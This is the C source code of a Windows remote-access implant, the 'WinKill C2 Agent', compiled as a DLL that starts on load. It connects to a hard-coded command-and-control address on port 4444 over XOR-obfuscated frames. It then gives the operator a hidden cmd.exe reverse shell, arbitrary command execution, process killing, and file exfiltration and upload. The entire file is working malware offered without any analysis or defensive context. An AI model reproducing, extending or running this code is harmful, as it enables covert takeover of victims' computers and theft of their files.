/*
 * WinKill C2 Agent
 * =================
 * Single-reader multiplexed agent with chunked file transfer support.
 */

#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdarg.h>

#ifndef C2_IP
#define C2_IP   0xA766A8C0
#endif
#ifndef C2_PORT
#define C2_PORT 4444
#endif

#define CHAN_CTRL      0x00000000
#define CHAN_SHELL_B   0x10000000
#define CHAN_SHELL(id) (CHAN_SHELL_B | (id))

#define MSG_HEARTBEAT   0x00
#define MSG_STATUS      0x01
#define MSG_SHUTDOWN    0x02
#define MSG_SHELL_SPAWN 0x10
#define MSG_SHELL_DATA  0x11
#define MSG_SHELL_KILL  0x12
#define MSG_PROC_LIST   0x20
#define MSG_PROC_KILL   0x21
#define MSG_BIN_EXEC    0x40
#define MSG_FILE_GET    0x50
#define MSG_FILE_PUT    0x51
#define MSG_FILE_DATA   0x52

#define FILE_OP_BEGIN 0x01
#define FILE_OP_CHUNK 0x02
#define FILE_OP_END   0x03
#define FILE_OP_ERROR 0x7F

#define FILE_CHUNK_SIZE 60000
#define MAX_FRAME_SIZE  0x100000

#define ENV_HOST_SHELL    "WK_HOST_SHELL"
#define ENV_STDIN_WR      "WK_HOST_STDIN_WR"
#define ENV_STDOUT_RD     "WK_HOST_STDOUT_RD"

static BYTE g_key[16] = {
    0x4A,0x7F,0x23,0x9C,0x11,0x8E,0x55,0x3D,
    0x6B,0x12,0x89,0xFA,0x34,0xD7,0x01,0xCB
};

typedef struct Job {
    DWORD  id, ch;
    HANDLE hp, ht, hi, ho;
    BYTE   on;
    BYTE   host;
    struct Job *nx;
} Job;

typedef struct UploadState {
    HANDLE     hf;
    DWORD      id;
    ULONGLONG  total;
    ULONGLONG  written;
    BYTE       active;
    char       path[MAX_PATH];
} UploadState;

static Job      *g_j   = NULL;
static DWORD     g_nid = 1;
static SOCKET    g_sk  = INVALID_SOCKET;
static volatile LONG g_r = 1;
static CRITICAL_SECTION g_l;
static CRITICAL_SECTION g_txl;
static UploadState g_up;

static void X(BYTE *d, DWORD n) {
    DWORD i;
    for (i = 0; i < n; i++) d[i] ^= g_key[i % 16];
}

static int SockSendAll(const BYTE *buf, DWORD len) {
    DWORD sent = 0;
    while (sent < len) {
        int r = send(g_sk, (const char *)buf + sent, (int)(len - sent), 0);
        if (r <= 0) return -1;
        sent += (DWORD)r;
    }
    return 0;
}

static int SockRecvAll(BYTE *buf, DWORD len) {
    DWORD got = 0;
    while (got < len) {
        int r = recv(g_sk, (char *)buf + got, (int)(len - got), 0);
        if (r <= 0) return -1;
        got += (DWORD)r;
    }
    return 0;
}

static int Tx(DWORD ch, BYTE t, const void *d, DWORD n) {
    DWORD tl = n + 5;
    BYTE *b = (BYTE *)HeapAlloc(GetProcessHeap(), 0, tl + 4);
    int r;
    if (!b) return -1;

    memcpy(b, &tl, 4);
    memcpy(b + 4, &ch, 4);
    b[8] = t;
    if (d && n) memcpy(b + 9, d, n);
    X(b + 4, tl);

    EnterCriticalSection(&g_txl);
    r = SockSendAll(b, tl + 4);
    LeaveCriticalSection(&g_txl);

    HeapFree(GetProcessHeap(), 0, b);
    return r;
}

static int Rx(DWORD *ch, BYTE *t, BYTE **d, DWORD *n) {
    DWORD tl = 0;
    BYTE *b;

    if (SockRecvAll((BYTE *)&tl, 4) != 0) return -1;
    if (tl > MAX_FRAME_SIZE || tl < 5) return -1;

    b = (BYTE *)HeapAlloc(GetProcessHeap(), 0, tl);
    if (!b) return -1;
    if (SockRecvAll(b, tl) != 0) {
        HeapFree(GetProcessHeap(), 0, b);
        return -1;
    }

    X(b, tl);
    memcpy(ch, b, 4);
    *t = b[4];
    *n = tl - 5;
    if (*n > 0) {
        *d = (BYTE *)HeapAlloc(GetProcessHeap(), 0, *n);
        if (!*d) {
            HeapFree(GetProcessHeap(), 0, b);
            return -1;
        }
        memcpy(*d, b + 5, *n);
    } else {
        *d = NULL;
    }

    HeapFree(GetProcessHeap(), 0, b);
    return 0;
}

static void TxFmt(BYTE t, const char *fmt, ...) {
    char buf[512];
    int n;
    va_list ap;

    va_start(ap, fmt);
    n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n < 0) return;
    if ((size_t)n >= sizeof(buf)) n = (int)sizeof(buf) - 1;
    Tx(CHAN_CTRL, t, buf, (DWORD)n);
}

static Job *JN(DWORD ch) {
    Job *j = (Job *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Job));
    if (!j) return NULL;
    j->id = g_nid++;
    j->ch = ch;
    j->on = 1;

    EnterCriticalSection(&g_l);
    j->nx = g_j;
    g_j = j;
    LeaveCriticalSection(&g_l);
    return j;
}

static Job *JF(DWORD ch) {
    Job *j = g_j;
    while (j) {
        if (j->ch == ch && j->on) return j;
        j = j->nx;
    }
    return NULL;
}

static void JC(HANDLE *h) {
    if (*h) {
        CloseHandle(*h);
        *h = NULL;
    }
}

static void JK(Job *j) {
    if (!j || !j->on) return;
    j->on = 0;

    if (!j->host && j->hp) {
        TerminateProcess(j->hp, 0);
    }
    JC(&j->hp);
    JC(&j->ht);
    JC(&j->hi);
    JC(&j->ho);
}

static void RP(void) {
    Job *j;
    EnterCriticalSection(&g_l);
    j = g_j;
    while (j) {
        if (j->on && j->hp && WaitForSingleObject(j->hp, 0) == WAIT_OBJECT_0) JK(j);
        j = j->nx;
    }
    LeaveCriticalSection(&g_l);
}

static DWORD WINAPI SO(LPVOID p) {
    Job *j = (Job *)p;
    BYTE b[8192];
    DWORD n = 0;

    while (j->on && ReadFile(j->ho, b, sizeof(b), &n, NULL) && n > 0) {
        if (Tx(j->ch, MSG_SHELL_DATA, b, n) != 0) break;
    }
    return 0;
}

static Job *SP(DWORD ch) {
    HANDLE r1 = NULL, w1 = NULL, r2 = NULL, w2 = NULL, h = NULL;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    Job *j;

    if (!CreatePipe(&r1, &w1, &sa, 0)) return NULL;
    if (!CreatePipe(&r2, &w2, &sa, 0)) {
        CloseHandle(r1);
        CloseHandle(w1);
        return NULL;
    }
    SetHandleInformation(w1, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(r2, HANDLE_FLAG_INHERIT, 0);

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = r1;
    si.hStdOutput = w2;
    si.hStdError = w2;

    if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        CloseHandle(r1);
        CloseHandle(w1);
        CloseHandle(r2);
        CloseHandle(w2);
        return NULL;
    }

    CloseHandle(r1);
    CloseHandle(w2);

    j = JN(ch);
    if (!j) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(w1);
        CloseHandle(r2);
        return NULL;
    }

    j->hp = pi.hProcess;
    j->ht = pi.hThread;
    j->hi = w1;
    j->ho = r2;

    h = CreateThread(NULL, 0, SO, j, 0, NULL);
    if (h) CloseHandle(h);
    return j;
}

static int ReadInheritedHandle(const char *name, HANDLE *out) {
    char buf[64];
    DWORD n;
    unsigned long long v;
    char *end = NULL;

    if (!out) return 0;
    *out = NULL;
    n = GetEnvironmentVariableA(name, buf, sizeof(buf));
    if (n == 0 || n >= sizeof(buf)) return 0;
    v = strtoull(buf, &end, 10);
    if (!end || *end) return 0;
    *out = (HANDLE)(ULONG_PTR)v;
    return *out != NULL;
}

static Job *BH(DWORD ch) {
    HANDLE hi = NULL, ho = NULL, h = NULL;
    HANDLE hp = NULL;
    Job *j;
    char enabled[8];

    if (GetEnvironmentVariableA(ENV_HOST_SHELL, enabled, sizeof(enabled)) == 0) return NULL;
    if (!ReadInheritedHandle(ENV_STDIN_WR, &hi)) return NULL;
    if (!ReadInheritedHandle(ENV_STDOUT_RD, &ho)) {
        JC(&hi);
        return NULL;
    }

    hp = OpenProcess(SYNCHRONIZE, FALSE, GetCurrentProcessId());
    j = JN(ch);
    if (!j) {
        JC(&hi);
        JC(&ho);
        JC(&hp);
        return NULL;
    }

    j->host = 1;
    j->hp = hp;
    j->hi = hi;
    j->ho = ho;

    h = CreateThread(NULL, 0, SO, j, 0, NULL);
    if (!h) {
        JK(j);
        return NULL;
    }
    CloseHandle(h);
    return j;
}

static void PS(void) {
    char b[8192] = {0};
    int p = 0;
    HANDLE sn = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;

    if (sn == INVALID_HANDLE_VALUE) return;

    p += wsprintfA(b + p, "%-8s %-6s %s\r\n", "PID", "PPID", "Name");
    p += wsprintfA(b + p, "------------------------\r\n");

    pe.dwSize = sizeof(pe);
    if (Process32First(sn, &pe)) {
        do {
            int r = (int)sizeof(b) - p - 128;
            if (r < 0) break;
            p += wsprintfA(b + p, "%-8lu %-6lu %s\r\n",
                           pe.th32ProcessID, pe.th32ParentProcessID, pe.szExeFile);
        } while (Process32Next(sn, &pe));
    }
    CloseHandle(sn);
    Tx(CHAN_CTRL, MSG_PROC_LIST, b, (DWORD)p);
}

static void PK(const char *s) {
    DWORD pi = (DWORD)atoi(s);
    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pi);
    if (h) {
        TerminateProcess(h, 0);
        CloseHandle(h);
        TxFmt(MSG_PROC_KILL, "Killed PID %lu\r\n", pi);
    } else {
        TxFmt(MSG_PROC_KILL, "Failed PID %lu\r\n", pi);
    }
}

static void UploadReset(BYTE delete_partial) {
    char path[MAX_PATH];
    path[0] = 0;
    if (delete_partial && g_up.path[0]) lstrcpynA(path, g_up.path, MAX_PATH);
    if (g_up.hf) CloseHandle(g_up.hf);
    ZeroMemory(&g_up, sizeof(g_up));
    if (delete_partial && path[0]) DeleteFileA(path);
}

static void SendFileError(DWORD id, const char *msg) {
    DWORD ml = (DWORD)strlen(msg);
    DWORD sz = 1 + 4 + ml;
    BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, sz);
    if (!buf) return;
    buf[0] = FILE_OP_ERROR;
    memcpy(buf + 1, &id, 4);
    memcpy(buf + 5, msg, ml);
    Tx(CHAN_CTRL, MSG_FILE_DATA, buf, sz);
    HeapFree(GetProcessHeap(), 0, buf);
}

static void SendFileBegin(DWORD id, const char *path, ULONGLONG total) {
    WORD pl = (WORD)strlen(path);
    DWORD sz = 1 + 4 + 8 + 2 + pl;
    BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, sz);
    if (!buf) return;
    buf[0] = FILE_OP_BEGIN;
    memcpy(buf + 1, &id, 4);
    memcpy(buf + 5, &total, 8);
    memcpy(buf + 13, &pl, 2);
    memcpy(buf + 15, path, pl);
    Tx(CHAN_CTRL, MSG_FILE_DATA, buf, sz);
    HeapFree(GetProcessHeap(), 0, buf);
}

static void SendFileChunk(DWORD id, const BYTE *data, DWORD len) {
    DWORD sz = 1 + 4 + len;
    BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, sz);
    if (!buf) return;
    buf[0] = FILE_OP_CHUNK;
    memcpy(buf + 1, &id, 4);
    memcpy(buf + 5, data, len);
    Tx(CHAN_CTRL, MSG_FILE_DATA, buf, sz);
    HeapFree(GetProcessHeap(), 0, buf);
}

static void SendFileEnd(DWORD id, ULONGLONG total) {
    BYTE buf[1 + 4 + 8];
    buf[0] = FILE_OP_END;
    memcpy(buf + 1, &id, 4);
    memcpy(buf + 5, &total, 8);
    Tx(CHAN_CTRL, MSG_FILE_DATA, buf, sizeof(buf));
}

static int ParseFilePathRequest(const BYTE *d, DWORD n, DWORD *id, char *path, DWORD cap) {
    WORD pl;
    if (!d || n < 6 || !id || !path || cap < 2) return 0;
    memcpy(id, d, 4);
    memcpy(&pl, d + 4, 2);
    if (pl == 0 || (DWORD)(6 + pl) > n || pl >= cap) return 0;
    memcpy(path, d + 6, pl);
    path[pl] = 0;
    return 1;
}

static void HandleFileGet(const BYTE *d, DWORD n) {
    DWORD id = 0;
    char path[MAX_PATH];
    HANDLE hf;
    LARGE_INTEGER sz;
    BYTE chunk[FILE_CHUNK_SIZE];
    DWORD rd = 0;
    BOOL ok = FALSE;

    if (!ParseFilePathRequest(d, n, &id, path, sizeof(path))) {
        TxFmt(MSG_STATUS, "ERROR: Invalid download request\r\n");
        return;
    }

    hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                     FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        SendFileError(id, "Cannot open remote file");
        TxFmt(MSG_STATUS, "ERROR: Cannot open %s\r\n", path);
        return;
    }
    if (!GetFileSizeEx(hf, &sz)) {
        CloseHandle(hf);
        SendFileError(id, "Cannot query remote file size");
        TxFmt(MSG_STATUS, "ERROR: Cannot stat %s\r\n", path);
        return;
    }

    SendFileBegin(id, path, (ULONGLONG)sz.QuadPart);
    while ((ok = ReadFile(hf, chunk, sizeof(chunk), &rd, NULL)) && rd > 0) {
        SendFileChunk(id, chunk, rd);
    }

    if (!ok) {
        DWORD err = GetLastError();
        CloseHandle(hf);
        SendFileError(id, "Read error");
        TxFmt(MSG_STATUS, "ERROR: Read failed on %s (%lu)\r\n", path, err);
        return;
    }

    CloseHandle(hf);
    SendFileEnd(id, (ULONGLONG)sz.QuadPart);
}

static void HandleFilePut(BYTE *d, DWORD n) {
    BYTE op;
    DWORD id;

    if (!d || n < 5) return;
    op = d[0];
    memcpy(&id, d + 1, 4);

    if (op == FILE_OP_BEGIN) {
        ULONGLONG total = 0;
        WORD pl = 0;
        char path[MAX_PATH];

        if (n < 15) return;
        memcpy(&total, d + 5, 8);
        memcpy(&pl, d + 13, 2);
        if (pl == 0 || (DWORD)(15 + pl) > n || pl >= sizeof(path)) {
            TxFmt(MSG_STATUS, "ERROR: Invalid upload path\r\n");
            return;
        }

        memcpy(path, d + 15, pl);
        path[pl] = 0;
        UploadReset(1);

        g_up.hf = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                              FILE_ATTRIBUTE_NORMAL, NULL);
        if (g_up.hf == INVALID_HANDLE_VALUE) {
            g_up.hf = NULL;
            TxFmt(MSG_STATUS, "ERROR: Cannot create %s\r\n", path);
            return;
        }

        g_up.id = id;
        g_up.total = total;
        g_up.written = 0;
        g_up.active = 1;
        lstrcpynA(g_up.path, path, MAX_PATH);
        TxFmt(MSG_STATUS, "Upload start: %s (%llu bytes)\r\n",
              g_up.path, (unsigned long long)g_up.total);
        return;
    }

    if (!g_up.active || g_up.id != id) return;

    if (op == FILE_OP_CHUNK) {
        DWORD len = n - 5;
        DWORD wr = 0;
        if (len == 0) return;
        if (!WriteFile(g_up.hf, d + 5, len, &wr, NULL) || wr != len) {
            TxFmt(MSG_STATUS, "ERROR: Upload write failed for %s\r\n", g_up.path);
            UploadReset(1);
            return;
        }
        g_up.written += wr;
        return;
    }

    if (op == FILE_OP_END) {
        char path[MAX_PATH];
        ULONGLONG written = g_up.written;
        ULONGLONG total = g_up.total;
        lstrcpynA(path, g_up.path, MAX_PATH);
        UploadReset(0);
        if (written == total) {
            TxFmt(MSG_STATUS, "Upload complete: %s (%llu bytes)\r\n",
                  path, (unsigned long long)written);
        } else {
            TxFmt(MSG_STATUS, "Upload complete with size mismatch: %s (%llu/%llu bytes)\r\n",
                  path, (unsigned long long)written, (unsigned long long)total);
        }
    }
}

static void HandleExec(const BYTE *d, DWORD n) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE r = NULL, w = NULL, hIn = NULL;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    BYTE buf[8192];
    DWORD rd = 0;
    char sysDir[MAX_PATH];
    const char *prefix = "\\cmd.exe /Q /C ";
    size_t sysLen, prefixLen, cmdLen;
    char *cmdLine;

    if (!d || n == 0) return;
    if (!CreatePipe(&r, &w, &sa, 0)) return;
    SetHandleInformation(r, HANDLE_FLAG_INHERIT, 0);

    hIn = CreateFileA("NUL", GENERIC_READ,
                      FILE_SHARE_READ | FILE_SHARE_WRITE, &sa,
                      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hIn == INVALID_HANDLE_VALUE) {
        CloseHandle(r);
        CloseHandle(w);
        return;
    }

    GetSystemDirectoryA(sysDir, MAX_PATH);
    sysLen = strlen(sysDir);
    prefixLen = strlen(prefix);
    cmdLen = (size_t)n;
    cmdLine = (char *)HeapAlloc(GetProcessHeap(), 0, sysLen + prefixLen + cmdLen + 1);
    if (!cmdLine) {
        CloseHandle(hIn);
        CloseHandle(r);
        CloseHandle(w);
        return;
    }

    memcpy(cmdLine, sysDir, sysLen);
    memcpy(cmdLine + sysLen, prefix, prefixLen);
    memcpy(cmdLine + sysLen + prefixLen, d, cmdLen);
    cmdLine[sysLen + prefixLen + cmdLen] = 0;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = hIn;
    si.hStdOutput = w;
    si.hStdError = w;

    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        TxFmt(MSG_BIN_EXEC, "CreateProcess failed: %lu\r\n", GetLastError());
        Tx(CHAN_CTRL, MSG_BIN_EXEC, NULL, 0);
        HeapFree(GetProcessHeap(), 0, cmdLine);
        CloseHandle(hIn);
        CloseHandle(r);
        CloseHandle(w);
        return;
    }

    HeapFree(GetProcessHeap(), 0, cmdLine);
    CloseHandle(hIn);
    CloseHandle(w);

    while (ReadFile(r, buf, sizeof(buf), &rd, NULL) && rd > 0) {
        if (Tx(CHAN_CTRL, MSG_BIN_EXEC, buf, rd) != 0) break;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(r);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    Tx(CHAN_CTRL, MSG_BIN_EXEC, NULL, 0);
}

static void Dispatch(DWORD ch, BYTE t, BYTE *d, DWORD n) {
    if ((ch & 0xF0000000) == CHAN_SHELL_B && t == MSG_SHELL_DATA) {
        Job *j = JF(ch);
        if (j && j->on && d) {
            DWORD w = 0;
            WriteFile(j->hi, d, n, &w, NULL);
        }
        if (d) HeapFree(GetProcessHeap(), 0, d);
        return;
    }

    switch (t) {
    case MSG_HEARTBEAT:
        break;

    case MSG_SHUTDOWN:
        g_r = 0;
        break;

    case MSG_SHELL_SPAWN:
        if (d && n >= 4) {
            DWORD nc = 0;
            Job *j;
            memcpy(&nc, d, 4);
            j = SP(nc);
            TxFmt(MSG_STATUS, "OK shell ch=%08X id=%lu\r\n", nc, j ? j->id : 0);
        }
        break;

    case MSG_SHELL_KILL:
        if ((ch & 0xF0000000) == CHAN_SHELL_B) {
            Job *j = JF(ch);
            if (j) JK(j);
        }
        break;

    case MSG_PROC_LIST:
        PS();
        break;

    case MSG_PROC_KILL:
        if (d && n) {
            char pid[32];
            DWORD copy = n < sizeof(pid) - 1 ? n : (DWORD)sizeof(pid) - 1;
            memcpy(pid, d, copy);
            pid[copy] = 0;
            PK(pid);
        }
        break;

    case MSG_FILE_GET:
        HandleFileGet(d, n);
        break;

    case MSG_FILE_PUT:
        HandleFilePut(d, n);
        break;

    case MSG_BIN_EXEC:
        HandleExec(d, n);
        break;
    }

    if (d) HeapFree(GetProcessHeap(), 0, d);
}

DWORD WINAPI AgentMain(LPVOID param) {
    WSADATA w;
    struct sockaddr_in a;
    DWORD lr = 0;

    (void)param;
    WSAStartup(MAKEWORD(2, 2), &w);
    InitializeCriticalSection(&g_l);
    InitializeCriticalSection(&g_txl);
    ZeroMemory(&g_up, sizeof(g_up));

    g_sk = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
    if (g_sk == INVALID_SOCKET) goto done;

    a.sin_family = AF_INET;
    a.sin_port = htons(C2_PORT);
    a.sin_addr.s_addr = C2_IP;

    if (connect(g_sk, (struct sockaddr *)&a, sizeof(a)) != 0) {
        closesocket(g_sk);
        g_sk = INVALID_SOCKET;
        goto done;
    }

    if (!BH(CHAN_SHELL(1))) SP(CHAN_SHELL(1));

    while (g_r) {
        struct timeval tv = {0, 100000};
        fd_set f;
        FD_ZERO(&f);
        FD_SET(g_sk, &f);

        if (select(0, &f, NULL, NULL, &tv) > 0) {
            DWORD ch = 0;
            BYTE t = 0;
            BYTE *d = NULL;
            DWORD n = 0;

            if (Rx(&ch, &t, &d, &n) == 0) {
                Dispatch(ch, t, d, n);
            } else {
                break;
            }
        }

        if (GetTickCount() - lr > 30000) {
            RP();
            lr = GetTickCount();
        }
    }

done:
    UploadReset(1);

    EnterCriticalSection(&g_l);
    while (g_j) {
        Job *nx = g_j->nx;
        JK(g_j);
        g_j = nx;
    }
    LeaveCriticalSection(&g_l);

    if (g_sk != INVALID_SOCKET) closesocket(g_sk);
    WSACleanup();
    DeleteCriticalSection(&g_txl);
    DeleteCriticalSection(&g_l);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID v) {
    (void)v;
    if (r == DLL_PROCESS_ATTACH) {
        HANDLE th;
        DisableThreadLibraryCalls(h);
        th = CreateThread(NULL, 0, AgentMain, NULL, 0, NULL);
        if (th) CloseHandle(th);
    }
    return TRUE;
}
